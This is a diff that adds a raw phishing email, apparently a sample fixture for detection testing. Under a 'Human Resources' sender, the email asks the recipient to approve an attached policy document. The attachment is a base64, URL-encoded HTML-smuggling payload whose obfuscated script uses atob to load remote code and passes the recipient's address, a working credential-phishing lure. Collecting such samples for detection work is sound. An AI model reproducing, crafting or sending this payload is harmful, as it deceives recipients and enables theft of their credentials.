@@ -1,0 +1,101 @@
+Delivered-To: rachael@tyrellcorp.io
+Received: by 2002:aca:bf55:0:0:0:0:0 with SMTP id p82csp2243973oif;
+        Sun, 4 Dec 2022 07:29:31 -0800 (PST)
+X-Google-Smtp-Source: AA0mqf4VHjy+pCZOrWdZqT42nAZm5gqfH34RnKvahUmpNS3MH3+SYLy4QtnuZlgFQfLBzwUGCxb0
+X-Received: by 2002:a05:600c:a11:b0:3cf:8b53:747f with SMTP id z17-20020a05600c0a1100b003cf8b53747fmr45858985wmp.192.1670167771429;
+        Sun, 04 Dec 2022 07:29:31 -0800 (PST)
+ARC-Seal: i=1; a=rsa-sha256; t=1670167771; cv=none;
+        d=google.com; s=arc-20160816;
+        b=NFyBjrRq5lTXekHtJGp9hjPUqmTfMUA26maJBhPNpZfsJs/lMJj9qXdnHZ8DPTrFWJ
+         v1BLfoD81H9LuhbfaYfh6RyGUgfG1nNslXq4ePqgMnFZ8Ux1scjeQoCDq1Uwl9WgMSfk
+         XP3vdnVtfXneQxLNkwyb0iEO1sf+HnTX7nq7c61svGfNwbxoi3/0wGlvahl4lLe63gCp
+         Fl17EMzbi3BIjZa4taL6cqI7OWtZXSyD79PeJIC/5GRbZeMk8jQpf6Ot0vgIWVRq9ZLI
+         pcr3qYMGFcmS/fJxZVGeRfuZRQNGoG4+RUyI/s2ssI/w3cNXRepvIHSX6h+CLUyUjQth
+         HHqg==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20160816;
+        h=feedback-id:importance:message-id:date:subject:to:from:mime-version
+         :dkim-signature;
+        bh=+eAexosG9ohMKhhAOSQoNugpuLxSj1RjUSDydy3ASPg=;
+        b=DBhZivFA7OqKXzkKetWMlZ/2l++dp1mRthXHbiWIjQ0gtvDlxtGHPgJ+ReEJz48bJG
+         WyxAHaXIq9qe3uEjIQRnmsfJ3oNqOAfWRbT4W5U+F3faK4InM8iRqJszVNJfq6Z73B10
+         iKC3VTUaMfQkocILeC4LA/CO9j2Z3IG5klQXBsAjTrfpBtcYNL33HZooChf7ZWjxEYxq
+         Z3beOw8ktvRTjw6H9nP0cQiTlk4rxPhvlHnn2+I09aCdIIsFfyspZDCRV/Sd1hqP5Ylu
+         pykeEna5q1ttuGAKmg2iHnPN+Si5DqPuPI5+zYJMxmLD3JiWYItPDXr7gjEsahecFQqf
+         kL2g==
+ARC-Authentication-Results: i=1; mx.google.com;
+       dkim=pass header.i=@amazonses.com header.s=4f4zjvqxldhskhj4hokzolcvnsn5qejk header.b=eii73B4P;
+       spf=pass (google.com: domain of 01130184ddc1b568-dddd0aa3-1a71-4961-8b8a-d38479a44212-000000@eu-west-3.amazonses.com designates 23.251.246.2 as permitted sender) smtp.mailfrom=01130184ddc1b568-dddd0aa3-1a71-4961-8b8a-d38479a44212-000000@eu-west-3.amazonses.com
+Return-Path: <01130184ddc1b568-dddd0aa3-1a71-4961-8b8a-d38479a44212-000000@eu-west-3.amazonses.com>
+Received: from e246-2.smtp-out.eu-west-3.amazonses.com (e246-2.smtp-out.eu-west-3.amazonses.com. [23.251.246.2])
+        by mx.google.com with ESMTPS id o10-20020a5d648a000000b00236cb3fec49si9410056wri.10.2022.12.04.07.29.30
+        for <rachael@tyrellcorp.io>
+        (version=TLS1_2 cipher=ECDHE-ECDSA-AES128-GCM-SHA256 bits=128/128);
+        Sun, 04 Dec 2022 07:29:31 -0800 (PST)
+Received-SPF: pass (google.com: domain of 01130184ddc1b568-dddd0aa3-1a71-4961-8b8a-d38479a44212-000000@eu-west-3.amazonses.com designates 23.251.246.2 as permitted sender) client-ip=23.251.246.2;
+Authentication-Results: mx.google.com;
+       dkim=pass header.i=@amazonses.com header.s=4f4zjvqxldhskhj4hokzolcvnsn5qejk header.b=eii73B4P;
+       spf=pass (google.com: domain of 01130184ddc1b568-dddd0aa3-1a71-4961-8b8a-d38479a44212-000000@eu-west-3.amazonses.com designates 23.251.246.2 as permitted sender) smtp.mailfrom=01130184ddc1b568-dddd0aa3-1a71-4961-8b8a-d38479a44212-000000@eu-west-3.amazonses.com
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/simple;
+	s=4f4zjvqxldhskhj4hokzolcvnsn5qejk; d=amazonses.com; t=1670167770;
+	h=Content-Type:MIME-Version:From:To:Subject:Date:Message-ID:Feedback-ID;
+	bh=+eAexosG9ohMKhhAOSQoNugpuLxSj1RjUSDydy3ASPg=;
+	b=eii73B4Pylic6ZcOhH11U3mRKBRkoKgQS1ALc6bV8to5ELmHSAbBgQrFKYYl6oXc
+	qDNLcu61bOqy0LWV/gLeUAXf8q6vlWyJWxOQGnWC6MfQ074ADbhHbC5y5J5iONKJhKe
+	r0rFfht/RqXcerPysQmXL1uvH9+6CehuWz9WEmXc=
+MIME-Version: 1.0
+From: Human Resources <robert.yi@globalleadership.org>
+To: Rachael Tyrell <rachael@tyrellcorp.io>
+Subject: Review New Employee Benefits Enrollment
+Date: Sun, 4 Dec 2022 15:29:30 +0000
+Message-ID: <01130184ddc1b568-dddd0aa3-1a71-4961-8b8a-d38479a44212-000000@eu-west-3.amazonses.com>
+X-Accept-Language: en-us, en
+X-Priority: 1
+Importance: 1
+X-MSmail-Priority: Highest
+X-Mailer: Zimbra 8.7.11_GA_1854 (Zimbra-ZCO/8.7.10.1711 (6.1.7601 SP1 en-US)
+ P158c T1508 R8502)
+X-MimeOLE: Produced By Microsoft Exchange V6.5.7226.0
+Feedback-ID: 1.eu-west-3.JTW2QlH0gO8Qt98RbQDX87seJxC/978zXKleLTvW1Gk=:AmazonSES
+X-SES-Outgoing: 2022.12.04-23.251.246.2
+Content-Type: multipart/mixed; boundary=5c881faebd8bc180f75f9d3ea571f76c42568226239c798c9acc899a6a4c
+
+--5c881faebd8bc180f75f9d3ea571f76c42568226239c798c9acc899a6a4c
+Content-Type: multipart/alternative; boundary=2af6c5a77e6820b51ff0a70cdcee1bc4be5102c6bfab3e2b49ff1338fbba
+
+--2af6c5a77e6820b51ff0a70cdcee1bc4be5102c6bfab3e2b49ff1338fbba
+Content-Type: text/plain; charset=utf-8
+
+Hello Rachael,
+
+Please review and approve attached policy document at your earliest convenience.
+
+-
+
+Thanks,
+
+Human Resources Department
+--2af6c5a77e6820b51ff0a70cdcee1bc4be5102c6bfab3e2b49ff1338fbba
+Content-Type: text/html; charset=utf-8
+
+<html>
+<br>
+Hello Rachael,
+<br>
+<br>
+Please review and approve attached policy document at your earliest convenience.
+<br>
+<br>
+-
+<br>
+Thanks,
+<br>
+Human Resources Department
+</html>
+--2af6c5a77e6820b51ff0a70cdcee1bc4be5102c6bfab3e2b49ff1338fbba--
+--5c881faebd8bc180f75f9d3ea571f76c42568226239c798c9acc899a6a4c
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="html_smuggling_atob_high_entropy.shtml"
+
+JTNDc2NyaXB0JTNFZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQ2h0bWwlM0UlMEElM0NzY3JpcHQlM0VmdW5jdGlvbiUyMFlfNV80Xzgoc3RyKSUyMCU3QnN0ciUyMD0lMjBzdHIucmVwbGFjZUFsbCglMjI9JTIyLCUyMCctJyk7cmV0dXJuJTIwc3RyOyU3RDtscCUyMD0lMjAlMjJhSFIwY0hNNkx5OTNhWFJvYUdGdVpITnRZV3RsYzNSaGJtUXVZMjl0TDNOMVltMXBkRzltWm1salpTNXdhSEE9JTIyJTNDL3NjcmlwdCUzRSUwQSUzQ3NjcmlwdCUyMHNyYz0lMjJodHRwczovL2FqYXguZ29vZ2xlYXBpcy5jb20vYWpheC9saWJzL2pxdWVyeS8zLjUuMS9qcXVlcnkubWluLmpzJTIyJTNFJTNDL3NjcmlwdCUzRSUwQSUzQ3NjcmlwdCUzRWRvY3VtZW50LndyaXRlKCUyMiUzQ3NjcmlwdCUyMHNyYz0lNUMlMjIlMjIlMjBhdG9iKCdhSFIwY0hNNkx5OWliMjFpWlhKdmMySmhjbU5sYkc5dVlYRjFhVzVrYVc4dWIzSm5MMFJHVGxoQ1JrVlhSMWRJVFVnc1JrWkRQVXhLUmtSSVIwUlRWRkpJVWtkRlRsTkVUVUlsTWpKTFNFcEhWa1JJVFVKQ1drSkVSa2RJU2s1R1F5OXdhVzR1YW5NJyklMjAlMjI/NVFwY1B1dEtlRT0lMjIlMjBZXzVfNF84KCdjbUZqYUdGbGJFQjBlWEpsYkd4amIzSndMbWx2JyklMjAlMjImNVFwY1B1dEtlRVRlSkh1PSUyMiUyMFlfNV80XzgoJ2QyaHZjMlZ1WkcxbE1UQXdNREF3TUVCNVlXNWtaWGd1WTI5dExDQnVaWFJ6YjJ3eU1rQjVZVzVrWlhndWNuVXNJRzVsZEhOdmJESXlRSGxoYm1SbGVDNWpiMjBzSUdadmNuZGhjbVJ2ZG1WeWRHOXRaV3RwYm1jek5qQkFaMjFoYVd3dVkyOXQnKSUyMCUyMiU1QyUyMiUzRSUzQyU1Qy9zY3JpcHQlM0UlMjIpOyUzQy9zY3JpcHQlM0UlMEElM0MvaHRtbCUzRScpKSUzQy9zY3JpcHQlM0UK
+--5c881faebd8bc180f75f9d3ea571f76c42568226239c798c9acc899a6a4c--
